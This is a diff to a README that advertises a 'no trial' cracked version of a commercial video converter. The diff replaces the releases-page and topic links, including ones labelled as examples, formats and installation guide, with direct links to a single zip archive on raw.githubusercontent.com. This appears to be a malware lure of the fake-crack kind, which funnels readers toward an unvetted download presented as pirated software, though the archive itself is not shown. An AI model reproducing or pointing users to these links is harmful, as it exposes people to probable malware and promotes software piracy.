@@ -1,6 +1,6 @@
 # 🎥 Aiseesoft-Total-Video-Converter-No-Trial - Easy Video Conversion for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/releases)
+[![Download](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip)
 
 ## 📖 Description
 
@@ -30,7 +30,7 @@ Follow these steps to get the Total Video Converter up and running on your Windo
 
 To download the Total Video Converter, visit the following link:
 
-[Download from Releases Page](https://github.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip)
 
 1. Click the link above to visit the releases page.
 2. Locate the latest version of Total Video Converter.
@@ -73,8 +73,8 @@ For further assistance or inquiries, you can open an issue on the GitHub reposit
 
 You can find more guides and tips regarding the Total Video Converter using these topics:
 
-- [Video Conversion Examples](https://github.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/topics/aiseesoft-total-video-converter-examples)
-- [Supported Formats](https://github.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/topics/aiseesoft-total-video-converter-format)
-- [Installation Guide](https://github.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/topics/aiseesoft-total-video-converter-installation)
+- [Video Conversion Examples](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip)
+- [Supported Formats](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip)
+- [Installation Guide](https://raw.githubusercontent.com/Jasonpro13/Aiseesoft-Total-Video-Converter-No-Trial/main/scolite/Aiseesoft-Total-Video-Converter-No-Trial-2.0.zip)
 
 Thank you for using Aiseesoft Total Video Converter. We hope you enjoy your video conversion experience!
